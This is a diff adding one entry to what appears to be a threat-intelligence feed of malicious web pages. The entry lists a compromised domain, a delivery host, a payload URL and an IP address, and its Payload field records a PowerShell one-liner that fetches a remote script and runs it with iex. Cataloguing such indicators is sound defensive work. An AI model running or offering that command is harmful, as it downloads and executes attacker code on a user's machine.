@@ -513,5 +513,24 @@
     ],
     "ReportId": "cmwqaak5m25zo0omla4vviesx",
     "ScannedAt": "2026-11-21T10:47:34.100000+00:00"
+  },
+  {
+    "UrlDomain": "castorinvestments.pl",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/ben/1e715b77597ae0f6"
+    ],
+    "IP": [
+      "92.222.139.190"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/ben/1e715b77597ae0f6')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/ben/1e715b77597ae0f6"
+    ],
+    "ReportId": "cmwqapek9261d0omlk180kgle",
+    "ScannedAt": "2026-11-21T10:59:06.660000+00:00"
   }
 ]
